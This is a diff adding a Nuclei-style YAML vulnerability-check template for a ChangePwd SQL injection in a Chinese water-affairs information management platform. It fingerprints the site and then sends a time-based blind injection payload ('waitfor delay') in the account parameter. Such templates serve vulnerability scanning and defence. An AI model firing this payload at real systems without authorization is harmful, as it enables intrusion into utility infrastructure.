@@ -1,0 +1,52 @@
+id: poc-yaml-wwkj-changepwd-sqli
+info:
+  name: 潍微科技-水务信息管理平台 ChangePwd SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    潍微科技-水务信息管理平台 ChangePwd SQL注入漏洞
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "水务信息管理平台"
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        GET /Account/ChangePwd?oldpwd=123456&newpwd=123456&conpwd=123456&account=1%27;waitfor%20delay%20%270:0:{{t1}}%27--+ HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '{"Result":"false","Msg":"用户输入的旧密码错误!"}'
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
+      - type: dsl
+        dsl:
+          - "response_time > to_number(t1)"
+          - "response_time < to_number(t2)"
+      - type: status
+        status:
+          - 200
